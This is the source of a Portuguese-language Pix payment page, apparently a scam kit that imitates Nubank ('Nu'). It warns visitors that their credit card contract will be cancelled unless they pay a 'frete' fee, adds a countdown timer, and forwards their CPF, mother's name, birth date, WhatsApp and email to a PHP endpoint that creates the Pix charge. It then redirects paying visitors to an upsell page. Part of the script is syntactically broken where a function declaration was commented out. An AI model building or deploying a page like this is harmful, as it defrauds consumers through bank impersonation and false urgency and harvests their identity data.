<!DOCTYPE html><html data-capo=""><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Nu</title>
      <?php include '../pixels.js'; ?>
        <link rel="stylesheet" href="../css/stylesfort.css">
         <link rel="stylesheet" href="../css/stylesfort2.css">

    <?php include '../pixels.js'; ?>    

</head>
<style>
    body {
    background: #f5f5f5;
}
</style>

    <body __processed_400f8f5b-357f-4aec-857d-677ec62b1a16__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d" cz-shortcut-listen="true">
        <style>
            /*! modern-normalize v2.0.0 | MIT License | https://github.com/sindresorhus/modern-normalize */
*, :after, :before {
    box-sizing: border-box;
}

html {
    font-family: system-ui, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji;
    line-height: 1.15;
    -webkit-text-size-adjust: 100%;
    -moz-tab-size: 4;pa
    -o-tab-size: 4;
    tab-size: 4;
}

body {
    margin: 0;
}

hr {
    color: inherit;
    height: 0;
}

abbr[title] {
    -webkit-text-decoration: underline dotted;
    text-decoration: underline dotted;
}

b, strong {
    font-weight: bolder;
}

code, kbd, pre, samp {
    font-family: ui-monospace, SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
    font-size: 1em;
}

small {
    font-size: 80%;
}

sub, sup {
    font-size: 75%;
    line-height: 0;
    position: relative;
    vertical-align: baseline;
}

sub {
    bottom: -.25em;
}

sup {
    top: -.5em;
}

table {
    border-color: inherit;
    text-indent: 0;
}

button, input, optgroup, select, textarea {
    font-family: inherit;
    font-size: 100%;
    line-height: 1.15;
    margin: 0;
}

button, select {
    text-transform: none;
}

[type=button], [type=reset], [type=submit], button {
    -webkit-appearance: button;
}

::-moz-focus-inner {
    border-style: none;
    padding: 0;
}

:-moz-focusring {
    outline: 1px dotted ButtonText;
}

:-moz-ui-invalid {
    box-shadow: none;
}

legend {
    padding: 0;
}

progress {
    vertical-align: baseline;
}

::-webkit-inner-spin-button, ::-webkit-outer-spin-button {
    height: auto;
}

[type=search] {
    -webkit-appearance: textfield;
    outline-offset: -2px;
}

::-webkit-search-decoration {
    -webkit-appearance: none;
}

::-webkit-file-upload-button {
    -webkit-appearance: button;
    font: inherit;
}

summary {
    display: list-item;
}

blockquote, dd, dl, figure, h1, h2, h3, h4, h5, h6, hr, ol, p, pre, ul {
    margin: 0;
}

ol, ul {
    list-style: none;
    padding: 0;
}

img, video {
    height: auto;
    max-width: 100%;
}

*, :after, :before {
    border: 0 solid #000;
}

:root {
    --primary: #005ca9;
    --red: #ef4444;
    --green: #27ae60;
}

body {
    background-color: #fff;
    color: #000;
    font-size: 16px;
}

#__nuxt, body, html {
    height: 100%;
}

a {
    color: #1b98e0;
    text-decoration: none;
}

a:hover {
    cursor: pointer;
    text-decoration: underline;
}

.text-red {
    color: var(--red);
}

.text-green {
    color: var(--green);
}

.text-primary {
    color: #E40881;
}

h2 {
    font-weight: 500;
}

.footer[data-v-63f14862] {
    border-bottom: 7px solid #E40881;
    border-top: 2px solid #edf0ef;
    color: #fff;
    color: #000;
    padding: 2rem 0;
    text-align: center
}

.footer p[data-v-63f14862] {
    margin: .5rem 0
}

.default-layout[data-v-77968890] {
    display: grid;
    grid-template-areas: "top-bar" "content" "footer";
    grid-template-rows: auto 1fr auto;
    min-height: 100vh
}

.default-layout .top-bar[data-v-77968890] {
    grid-area: top-bar
}

.default-layout .content[data-v-77968890] {
    background-color: #f5f7f9;
    grid-area: content
}

.default-layout .footer[data-v-77968890] {
    grid-area: footer
}

img.logo[data-v-4f7075cc] {
    height: var(--2348ed9e);
    width: auto
}

h1.logo[data-v-4f7075cc] {
    color: #fff;
    text-shadow: 0 1px 2px rgba(0,0,0,.2)
}

.top-bar[data-v-f5d5d4cd] {
    background-color: #f5cc0d;
    border-bottom: 1px solid hsla(0,0%,100%,.3);
    width: 100%
}

.top-bar .container[data-v-f5d5d4cd] {
    display: grid;
    padding: 1.5rem 0;
    place-content: center
}
.payment-card[data-v-6f494b70] {
    display: grid;
    gap: 1rem;
    justify-items: center;
    text-align: center
}

.card-title[data-v-6f494b70] {
    align-items: center;
    display: grid;
    gap: .5rem;
    grid-template-columns: repeat(2,auto)
}

.card-title .icon[data-v-6f494b70] {
    color: #3db1a5;
    font-size: 1.8rem
}

.card-sub-title[data-v-6f494b70] {
    align-items: center;
    display: grid;
    gap: .5rem;
    grid-template-columns: repeat(2,auto)
}

.card-sub-title .icon[data-v-6f494b70] {
    color: #419c63;
    font-size: 1.2rem
}

.fee-value[data-v-6f494b70] {
    color: #3db1a5;
    font-size: 2rem;
    font-weight: 500
}
.loading-text[data-v-0f314a8f] {
    align-items: center;
    display: grid;
    gap: .5rem;
    grid-template-columns: auto 1fr;
    justify-content: center
}

.loading-text .icon[data-v-0f314a8f] {
    animation: spin 2s linear infinite
}
.faq-item[data-v-8c748230] {
    border-top: 1px solid #d4dae0;
    color: #000;
    cursor: pointer;
    font-weight: 400
}

.faq-item .question[data-v-8c748230] {
    align-items: center;
    display: grid;
    grid-template-columns: auto 1fr;
    padding: .5rem 0
}

.faq-item .question.expanded .icon[data-v-8c748230] {
    transform: rotate(180deg)
}

.faq-item .question .icon[data-v-8c748230] {
    color: #E40881;
    font-size: 2.5rem;
    transition: transform .2s ease-out
}

.faq-item .answer[data-v-8c748230] {
    display: grid;
    gap: 1rem;
    max-height: 0;
    overflow: hidden;
    transition: max-height .2s ease-out
}

.faq-item .answer .content[data-v-8c748230] {
    color: #00000080;
    padding: .2rem 1rem 1.5rem
}

.question.expanded[data-v-8c748230]:after {
    transform: translateY(-50%) rotate(90deg)
}
.container[data-v-0041013f] {
    box-sizing: border-box;
    margin: 0 auto;
    padding-left: 1rem;
    padding-right: 1rem
}

@media (min-width: 640px) {
    .container[data-v-0041013f] {
        max-width:90%
    }
}

@media (min-width: 768px) {
    .container[data-v-0041013f] {
        max-width:85%
    }
}

@media (min-width: 1024px) {
    .container[data-v-0041013f] {
        max-width:80%
    }
}

@media (min-width: 1280px) {
    .container[data-v-0041013f] {
        max-width:1000px
    }
}
.card-title[data-v-303a1430]{color:#000;font-size:1.35rem;font-weight:500}
.card-sub-title[data-v-2901cb0a]{color:#00000080;line-height:1.5}
.card[data-v-cca10726] {
    background-color: #fff;
    border-radius: 10px;
    box-shadow: 0 1px 4px #0008260a;
    padding: 10px;
    width: 100%
}
.button[data-v-d342e251] {
    border-radius: 1rem;
    cursor: pointer;
    font-weight: 500;
    letter-spacing: .3px;
    padding: .75rem 3rem;
    transition: opacity .1s;
    width: -moz-max-content;
    width: max-content
}

.button.light[data-v-d342e251] {
    background: #fff;
    color: #E40881
}

.button.primary[data-v-d342e251] {
    background: #E40881;
    color: #fff
}

.button[data-v-d342e251]:hover {
    opacity: .9
}

.button[data-v-d342e251]:disabled {
    cursor: not-allowed;
    opacity: .5
}
.divider[data-v-b5121d9d] {
    background-color: #E40881;
    border-radius: 10px;
    height: 2px;
    width: 80px
}

.registration-fee-video[data-v-6b06b597] {
    border: 1px solid #9d9d9d;
    border-radius: 5px;
    color: #000;
    display: grid;
    gap: 1rem;
    padding: 3rem 1rem;
    position: relative
}

.registration-fee-video[data-v-6b06b597]:before {
    background-color: transparent;
    border: 1px solid #9d9d9d;
    border-radius: 5px;
    content: "";
    height: 96%;
    left: 50%;
    position: absolute;
    top: 50%;
    transform: translate(-50%,-50%);
    width: 106%
}

.card-sub-title[data-v-6b06b597] {
    align-items: center;
    display: grid;
    font-size: 1.2rem;
    gap: .5rem;
    grid-auto-columns: auto;
    grid-auto-flow: column;
    justify-content: left
}

video[data-v-6b06b597] {
    border: 1px solid #9d9d9d;
    border-radius: 5px
}

.timeline-part[data-v-7f42729f] {
    align-items: center;
    display: grid;
    gap: 1.3rem;
    grid-template-columns: auto 1fr
}

.timeline-part.done[data-v-7f42729f] {
    color: #419c63
}

.timeline-part.done .dot[data-v-7f42729f] {
    background-color: #419c63
}

.timeline-part.current[data-v-7f42729f] {
    color: var(--red)
}

.timeline-part.current .dot[data-v-7f42729f] {
    animation: pulse-7f42729f 1s infinite;
    background-color: var(--red)
}

@keyframes pulse-7f42729f {
    0% {
        -webkit-box-shadow: 0 0 0 0 var(--red)
    }

    70% {
        -webkit-box-shadow: 0 0 0 15px rgba(255,0,0,0)
    }

    to {
        -webkit-box-shadow: 0 0 0 0 rgba(255,0,0,0)
    }
}

.timeline-part.pending[data-v-7f42729f] {
    color: #0000004d
}

.timeline-part.pending .dot[data-v-7f42729f] {
    background-color: #d5d5d5
}

.dot[data-v-7f42729f] {
    background-color: #E40881;
    border-radius: 50%;
    height: 20px;
    outline: 5px solid #f5f7f9;
    position: relative;
    width: 20px
}

.body[data-v-7f42729f] {
    align-items: center;
    display: grid;
    gap: .5rem;
    grid-template-columns: auto 1fr
}

.body .icon[data-v-7f42729f] {
    font-size: 2.5rem
}

.body .text[data-v-7f42729f] {
    display: grid;
    gap: .35rem
}

.loan-status-timeline[data-v-9f1c2f74] {
    display: grid;
    gap: 2rem;
    position: relative
}
.loan-reason-options {
    display: grid;
    gap: 1rem;
}

.loan-reason-options ul {
    display: grid;
    gap: 1rem;
    grid-template-columns: repeat(2, 1fr);
}

.bar[data-v-9f1c2f74] {
    background-color: #d5d5d5;
    height: 87%;
    left: 10px;
    position: absolute;
    top: 20px;
    transform: translate(-50%);
    width: 3px
}

.timer-part[data-v-9adafdf3] {
    background-color: var(--red);
    border-radius: 5px;
    display: grid;
    text-align: center;
    width: 100px
}

.timer-part h4[data-v-9adafdf3] {
    font-size: 2rem;
    letter-spacing: .1rem;
    padding: .75rem 0;
    text-shadow: 0 0 5px rgba(0,0,0,.5)
}

.timer-part .label[data-v-9adafdf3] {
    background-color: #707070;
    border-radius: 5px;
    padding: .2rem 0;
    width: 100%
}

.countdown-timer[data-v-441b54a3] {
    color: #fff;
    display: grid;
    gap: 1rem
}

.timer[data-v-441b54a3] {
    display: grid;
    gap: .5rem;
    grid-template-columns: repeat(2,auto);
    justify-content: center
}

.card-title[data-v-441b54a3],.description[data-v-441b54a3],.waring[data-v-441b54a3] {
    text-align: center
}

.waring[data-v-441b54a3] {
    color: var(--red)
}

.registration-fee-faq[data-v-a343b494] {
    display: grid;
    gap: 1rem
}

.fee-page[data-v-89cb6f88] {
    margin: 2.5rem 0
}

.container[data-v-89cb6f88] {
    display: grid;
    gap: 3rem;
    max-width: 480px
}

.intro[data-v-89cb6f88] {
    display: grid;
    gap: .75rem
}

.intro .headline[data-v-89cb6f88] {
    color: #E40881;
    font-size: 1.5rem;
    font-weight: 500
}

        </style>
          <div id="__nuxt" bis_skin_checked="1">
            <div class="default-layout" data-v-77968890="" bis_skin_checked="1">
              <header class="top-bar" data-v-77968890="" data-v-f5d5d4cd="">
                <div class="container" data-v-f5d5d4cd="" data-v-0041013f="" bis_skin_checked="1">
                  <!--[-->
                  <h1 class="logo" data-v-f5d5d4cd="" style="--2348ed9e: 10px; color: white;" data-v-4f7075cc=""><img src="../logo.webp" style="max-width:150px"></h1>
                  <!--]-->
                </div>
              </header>
              <main class="content" data-v-77968890="">
                <!--[-->
                <div class="fee-page" data-v-89cb6f88="" bis_skin_checked="1">
                  <div class="container" data-v-89cb6f88="" data-v-0041013f="" bis_skin_checked="1">
                    <!--[-->
                    
                    
                    
                    <div class="countdown-timer" data-v-89cb6f88="" data-v-441b54a3="">
                      <span class="card-title" data-v-441b54a3="" data-v-303a1430=""><!--[--></span>
                      <span data-v-441b54a3="">
                        <div data-v-441b54a3="" class="timer">
                          <div data-v-9adafdf3="" data-v-441b54a3="" class="timer-part">
                            <h4 data-v-9adafdf3="" id="minutes-count"></h4>
                            <span data-v-9adafdf3="" class="label">minutos</span></div>
                            <div data-v-9adafdf3="" data-v-441b54a3="" class="timer-part">
                              <h4 data-v-9adafdf3="" id="seconds-count"></h4><span data-v-9adafdf3="" class="label">segundos</span></div>
                            </div></span><div class="description" data-v-441b54a3="">
                              <span class="card-sub-title" data-v-441b54a3="" data-v-2901cb0a=""><!--[--> O não pagamentodo frete resulta no cancelamento do contrato do cartão de crédito, impossibilitando uma nova contratação por um prazo máximo de 30 dias <!--]--></span></div>
                    </div>
                    <div class="card payment-card" data-v-89cb6f88="" data-v-6f494b70="" data-v-cca10726="" bis_skin_checked="1">
                      <!--[-->
                      


								
				
				
		
			
					
                      



<hr>
<div style="text-align: center; font-family: Arial, sans-serif; max-width: 300px; margin: 0 auto; padding: 20px;">
    <div style="margin-bottom: 15px;">
        <span style="color: #000; font-size: 1.35rem; font-weight: 500;">
            <span style="font-size: 21px; font-weight:600; color: black;">Pague via Pix</span>
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" style="color: #3db1a5; font-size: 1.8rem;" width="1em" height="1em" viewBox="0 0 24 24">
                <path fill="currentColor" d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
                <path fill="currentColor" d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.042 3.042 0 0 0-.02-4.29"></path>
            </svg>
        </span>
    </div>
    <div style="color: #666666; font-size: 14px; margin-bottom: 15px;">
        O pagamento será confirmado imediatamente
    </div>
    <div id="freteValorDisplay" style="color: #00B9D1; font-size: 32px; font-weight: bold;">
    R$ ...
</div>

</div>

<style>
    main.content {
        padding: 10px;
    }
    
    /* QR Code */
    .qr-container {
        text-align: center;
        margin-bottom: 14px;
        padding: 10px;
        background: #f8f9fa;
        border-radius: 8px;
    }
    
    .qr-container img {
        max-width: 250px;
        margin: 0 auto;
    }

    /* Loading Animation */
    .loading {
        display: none;
        text-align: center;
        margin-bottom: 14px;
    }

    .loading img {
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    /* Campo de código */
    .code-input {
        width: 100%;
        padding: 12px;
        border: 2px solid #e2e8f0;
        border-radius: 6px;
        font-size: 14px;
        background: #f8fafc;
        margin-bottom: 12px;
        font-family: monospace;
    }
    
    /* Botões */
    .btn {
        width: 100%;
        padding: 12px;
        border: none;
        border-radius: 6px;
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-bottom: 12px;
    }
    
    .btn:hover {
        transform: translateY(-1px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }
    
    .btn:active {
        transform: translateY(0);
    }
    
    .btn-copy {
        background: #3b82f6;
        color: white;
    }
    
    .btn-copy:hover {
        background: #2563eb;
    }
    
    .btn-verify {
        background: #22c55e;
        color: white;
    }
    
    .btn-verify:hover {
        background: #16a34a;
    }
    
    /* Status */
    .status-text {
        text-align: center;
        font-size: 18px;
        font-weight: 500;
        margin: 20px 0;
        color: #4b5563;
    }
    
    /* Mensagem de sucesso */
    .success-message {
        color: #16a34a;
        font-weight: 600;
    }
    
    /* Mensagem de erro */
    .error-message {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        background: #ef4444;
        color: white;
        border-radius: 6px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        animation: slideIn 0.3s ease;
    }

    /* Popup de Sucesso */
    .success-popup {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #ffffff;
        padding: 20px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        border-radius: 10px;
        text-align: center;
        z-index: 1000;
    }

    .popup-content h3 {
        color: #16a34a;
        margin-bottom: 10px;
        width:80%;
    }

    /* Responsividade */
    @media (max-width: 640px) {
        .container {
            padding: 15px;
        }
    }
    
    h3 {
        font-size: 18px;
    }
    h2 {
        font-size: 18px;
    }
</style>


<script>
// UTM FENIX
async function getUserIp() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        if (response.ok) {
            const data = await response.json();
            return data.ip;
        } else {
            console.error('Erro ao obter o IP do usuário:', response.statusText);
            return '';
        }
    } catch (error) {
        console.error('Erro ao obter o IP do usuário:', error);
        return '';
    }
}

// Função para obter valores UTM da URL
function getUtmFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return {
        utm_source: urlParams.get('utm_source') || '',
        utm_campaign: urlParams.get('utm_campaign') || '',
        utm_medium: urlParams.get('utm_medium') || '',
        utm_content: urlParams.get('utm_content') || '',
        utm_term: urlParams.get('utm_term') || ''
    };
}

// Função para compor os detalhes do cliente
async function getCustomerDetails() {
    const userData = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
    const userEmail = localStorage.getItem('email') || '';

    // Obtendo o IP do usuário
    const userIp = await getUserIp();

    return {
        customerName: userData.nome || 'Nome não disponível',
        customerEmail: userEmail || 'Email não disponível',
        customerPhone: userData.numero || 'Número não disponível',
        customerDocument: userData.cpf || 'CPF não disponível',
        customerCountry: 'BR',
        customerIp: userIp || 'IP não disponível'
    };
}

function saveLog(data) {
    const logs = JSON.parse(localStorage.getItem('requestLogs')) || [];
    logs.push(data);
    localStorage.setItem('requestLogs', JSON.stringify(logs));
    console.log('Log salvo:', data);
}

//window.sendOrderStatus = async function sendOrderStatus(orderId, status) {
    console.log('Iniciado para orderId: ' + orderId + ' | status: ' + status);
    const currentDateTime = new Date().toISOString().replace('T', ' ').split('.')[0];
    let createdAtGlobal = null;

    // Obter detalhes do cliente
    const customerDetails = await getCustomerDetails();

    // Recuperar valores UTM da URL
    const utmData = getUtmFromUrl();

    let freteValor = localStorage.getItem('freteValor');
    let freteNumerico = 0;
    if (freteValor) {
        freteNumerico = Math.round(parseFloat(freteValor.replace('R$', '').replace(/\s/g, '').replace(',', '.')) * 100);
    }

    // Atualizar ou criar dados no localStorage
    let savedData = {};
    if (status === 'waiting_payment') {
        createdAtGlobal = currentDateTime;
        savedData = {
            orderId: orderId,
            platform: 'Spectra',
            paymentMethod: 'pix',
            status: status,
            createdAt: createdAtGlobal,
            approvedDate: '',
            ...customerDetails,
            productId: 'N_01',
            productName: 'N_01',
            productQuantity: 1,
            productPriceInCents: freteNumerico,
            commissionTotalPriceInCents: freteNumerico,
            commissionGatewayFeeInCents: 0,
            commissionUserCommissionInCents: freteNumerico,
            ...utmData,
            isTest: false
        };
        localStorage.setItem('utms', JSON.stringify(savedData));
    } else if (status === 'paid') {
        savedData = JSON.parse(localStorage.getItem('utms')) || {};
        if (!savedData.createdAt) {
            console.error('Erro: Dados de createdAt não encontrados no localStorage.');
            return;
        }
        savedData.status = status;
        savedData.approvedDate = currentDateTime;
        localStorage.setItem('utms', JSON.stringify(savedData));
    }

    // Monta os parâmetros para enviar via GET
    const params = new URLSearchParams(savedData);

    try {
        // Envia a requisição para o PHP
        const response = await fetch(`../fnx-utm.php?${params.toString()}`, {
            method: 'GET'
        });

        const logData = {
            timestamp: currentDateTime,
            request: `../fnx-utm.php?${params.toString()}`,
            requestData: savedData
        };

        // Processa a resposta
        if (response.ok) {
            const result = await response.text();
            logData.response = result;
            console.log('Resposta do servidor:', result);
        } else {
            logData.response = `Erro: ${response.statusText}`;
            console.error('Erro na requisição:', response.statusText);
        }

        // Salva o log no localStorage
        saveLog(logData);

    } catch (error) {
        const logData = {
            timestamp: currentDateTime,
            request: `../fnx-utm.php?${params.toString()}`,
            requestData: savedData,
            response: `Erro: ${error.message}`
        };

        // Salva o log no localStorage
        saveLog(logData);
        console.error('Erro ao comunicar com o servidor:', error);
    }
}
</script>





<div id="payment-container" class="container">
    <!-- Animação de Carregando -->
    <div id="loading-animation" class="loading">
        <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando...">
        <p>Carregando...</p>
    </div>

    <!-- Container de Pagamento (oculto até carregamento concluir) -->
    <div id="payment-info" style="display: none;">
        <!-- Timestamp -->
        <div id="timestamp" class="text-sm text-gray-500 text-center mb-4"></div>

        <!-- QR Code -->
        <div class="qr-container">
            <img id="qr-code" src="" alt="QR Code Pix" style="width: 196px;">
        </div>

        <!-- Código de Pagamento -->
        <div class="payload-container">
            <input id="payload-input" type="text" readonly class="code-input">
            <button id="copy-button" class="btn btn-copy">
                Copiar código de pagamento
            </button>
        </div>

        <!-- Status -->
        <div class="status-container">
            <p id="status-text" class="status-text">Aguardando pagamento...</p>
            <button id="verify-button" class="btn btn-verify">
                Verificar Pagamento
            </button>
        </div>
    </div>
</div>
<script>
  fbq('track', 'InitiateCheckout');
</script>
<script>
    // Função para mostrar a mensagem de erro
    function showError(message) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            errorDiv.remove();
        }, 3000);
    }

    // Função para montar a interface de pagamento
    function mountPaymentInterface(data) {
        // Atualiza timestamp
        const timestamp = new Date(data.timestamp || Date.now()).toLocaleString();
        
        // Atualiza QR Code
        document.getElementById('qr-code').src = data.pixQrCode; // Atualizado para refletir a resposta

        // Atualiza código de pagamento
        const payloadInput = document.getElementById('payload-input');
        payloadInput.value = data.pixCode; // Atualizado para refletir a resposta

        // Configura botão de cópia
        const copyButton = document.getElementById('copy-button');
        copyButton.onclick = () => {
            navigator.clipboard.writeText(data.pixCode) // Atualizado
                .then(() => {
                    copyButton.textContent = 'Código copiado!';
                    setTimeout(() => {
                        copyButton.textContent = 'Copiar código de pagamento';
                    }, 2000);
                })
                .catch(() => showError('Erro ao copiar código'));
        };

        // Configura botão de verificação
        const verifyButton = document.getElementById('verify-button');
        verifyButton.onclick = () => checkPaymentStatus(data.id); // Atualizado

        // Inicializa o status
        updatePaymentStatus(data.status); // Atualizado para refletir o status correto
    }

    // Função para verificar o status do pagamento
    async function checkPaymentStatus(transactionId) {
        try {
            const response = await fetch(`../fnx-info.php?orderId=${transactionId}`);
            if (!response.ok) {
                throw new Error('Erro ao verificar status');
            }
            const data = await response.json();

            // Atualiza o código aqui para buscar o status corretamente
            const status = data.status; // Acessando o status corretamente

            updatePaymentStatus(status);

            if (status === 'APPROVED') {
                stopPaymentPolling();
                
                ///(transactionId, 'paid');
                //fbq('track', 'Purchase', { value: (parseFloat(data.amount) / 100).toFixed(2), currency: 'BRL' });

                // Mostrar popup de sucesso e redirecionar
                const popup = document.createElement('div');
                popup.className = 'success-popup';
                popup.innerHTML = `
                    <div class="popup-content">
                        <h3>Pagamento Recebido!</h3>
                        <p>O pagamento foi confirmado com sucesso.<br>
                        Você será redirecionado em 3 segundos...<br>
                        Aguarde!</p>
                    </div>`;
                document.body.appendChild(popup);

                setTimeout(() => {
                    window.location.href = '../nfe/' + window.location.search;
                }, 3500);
            }
        } catch (error) {
            console.error('Erro ao verificar status:', error);
            showError('Erro ao verificar status do pagamento');
        }
    }

    // Função para atualizar o status na interface
    function updatePaymentStatus(status) {
        const statusText = document.getElementById('status-text');
        if (status === 'APPROVED') {
            statusText.textContent = 'Pagamento confirmado!';
            statusText.className = 'status-text success-message';
        } else {
            statusText.textContent = 'Aguardando pagamento...';
            statusText.className = 'status-text';
        }
    }

    // Variável para controlar o polling
    let pollingInterval;

    // Função para iniciar o polling de verificação
    function startPaymentPolling(transactionId) {
        // Verifica a cada 10 segundos
        pollingInterval = setInterval(() => {
            checkPaymentStatus(transactionId);
        }, 10000);
    }

    // Função para parar o polling
    function stopPaymentPolling() {
        if (pollingInterval) {
            clearInterval(pollingInterval);
        }
    }

    const segments = window.location.pathname.split('/').filter(segment => segment !== '');
    const lastSegment = segments.length > 0 && /^\d+$/.test(segments[segments.length - 1]) ? segments.pop() : 'defaultTransaction';
    const TRANSACTION_KEY = `currentTransaction_${lastSegment}`;
    console.log('xxxxxxxxxxxxxxxx   ' + TRANSACTION_KEY);

    // Função para mostrar a animação de carregamento
    function showLoading() {
        document.getElementById('loading-animation').style.display = 'block';
        document.getElementById('payment-info').style.display = 'none';
    }

    // Função para esconder a animação de carregamento
    function hideLoading() {
        document.getElementById('loading-animation').style.display = 'none';
        document.getElementById('payment-info').style.display = 'block';
    }

    // Função principal para inicializar o pagamento
    async function initializePayment() {
        try {
            showLoading(); // Mostra animação de carregamento

            const existingTransaction = localStorage.getItem(TRANSACTION_KEY);
            
            if (existingTransaction) {
                const transactionData = JSON.parse(existingTransaction);
                
                const response = await fetch(`../fnx-info.php?orderId=${transactionData.id}`);
                if (response.ok) {
                    const statusData = await response.json();
                    
                    const status = statusData.status; // Atualizado para o campo correto
                
                    if (status === 'APPROVED') {
                        hideLoading(); // Esconde animação de carregamento
                        fbq('track', 'Purchase', { value: (parseFloat(transactionData.amount) / 100).toFixed(2), currency: 'BRL' });
                        
                        const popup = document.createElement('div');
                        popup.className = 'success-popup';
                        popup.innerHTML = `
                            <div class="popup-content">
                                <h3>Pagamento Recebido!</h3>
                                <p>O pagamento foi confirmado com sucesso.<br>...</p>
                            </div>`;
                        document.body.appendChild(popup);
                
                        setTimeout(() => {
                            window.location.href = '../up/1/' + window.location.search;
                        }, 3500);
                        return;
                    }
                
                    if (status === 'waiting_payment') {
                        console.log('Recuperando transação existente');
                        mountPaymentInterface(transactionData);
                        startPaymentPolling(transactionData.id);
                        hideLoading(); // Esconde animação de carregamento
                        return;
                    }
                }

                localStorage.removeItem(TRANSACTION_KEY);
            }

            // Se não existe transação ou ela expirou, cria uma nova
            await createPayment();

        } catch (error) {
            console.error('Erro ao inicializar pagamento:', error);
            showError('Erro ao inicializar pagamento. Por favor, recarregue a página.');
        } finally {
            hideLoading(); // Esconde animação de carregamento
        }
    }

    // Função para criar novo pagamento
    async function createPayment() {
        try {
            showLoading(); // Mostra animação de carregamento
            
            // Obtém os parâmetros da URL
            const queryParams = new URLSearchParams(window.location.search);
    
            const cpf = queryParams.get('cpf') || '';
            const email = queryParams.get('email') || '';
            const nome = queryParams.get('name') || '';
            const dataNascimento = queryParams.get('dataNascimento') || '';
            const nomeMae = queryParams.get('nomeMae') || '';
            const whatsapp = queryParams.get('whatsapp') || '';
            const genero = queryParams.get('genero') || '';
            const freteNumero = queryParams.get('unitPrice') || '';
 
    
            const params = new URLSearchParams({
                cpf,
                name: nome,
                dataNascimento,
                nomeMae,
                whatsapp,
                prod: 'Frete',
                genero,
                email, // Adiciona o e-mail nos parâmetros
                unitPrice: freteNumero || 500 // Envia o valor do frete como unitPrice, ou 500 caso não tenha o valor
            });
    
            console.log(params.toString()); // Exibe os parâmetros para depuração
            
            // Faz a requisição para o fnx.php
            const response = await fetch(`../fnx.php?${params.toString()}`);
    
            // Log da resposta antes de tentar converter para JSON
            const textResponse = await response.text(); // Pega a resposta como texto
            console.log('Resposta do servidor:', textResponse);
    
            // Tenta converter a resposta para JSON
            const paymentData = JSON.parse(textResponse); // Usando JSON.parse no texto da resposta
            console.log(paymentData);
            
            // Verifique se a resposta está no formato esperado
/*            if (!paymentData || !paymentData.id) {
                throw new Error('Resposta do servidor inválida');
            }
            */
            
            //sendOrderStatus(paymentData.id, 'waiting_payment');
    
            localStorage.setItem(TRANSACTION_KEY, JSON.stringify(paymentData));
            
            mountPaymentInterface(paymentData);
            startPaymentPolling(paymentData.id);
    
        } catch (error) {
            console.error('Erro ao criar pagamento:', error);
            showError('Erro ao criar pagamento. Por favor, tente novamente.');
        } finally {
            hideLoading(); // Esconde animação de carregamento
        }
    }

    // Inicia o processo quando a página carrega
    document.addEventListener('DOMContentLoaded', initializePayment);
</script>

          <br>
      
  <div style="max-width: 600px; margin: 0 auto; background: #f9f9f9; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
       <h2 style="color: #2d3748; text-align: center; margin-bottom: 20px;">Como pagar usando PIX</h2>
       
       <div style="background: #fff; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
           <h3 style="color: #4a5568; margin-top: 0;">Opção 1: Código Copia e Cola</h3>
           <ol style="color: #4a5568; padding-left: 20px; list-style-type: decimal;">
               <li style="margin-bottom: 10px;">Abra o aplicativo do seu banco</li>
               <li style="margin-bottom: 10px;">Procure a opção "PIX" ou "Pagar com PIX"</li>
               <li style="margin-bottom: 10px;">Selecione "Copiar e Colar" ou "PIX Copia e Cola"</li>
               <li style="margin-bottom: 10px;">Cole o código PIX que você copiou acima</li>
               <li style="margin-bottom: 10px;">Confira os dados e confirme o pagamento</li>
           </ol>
       </div>

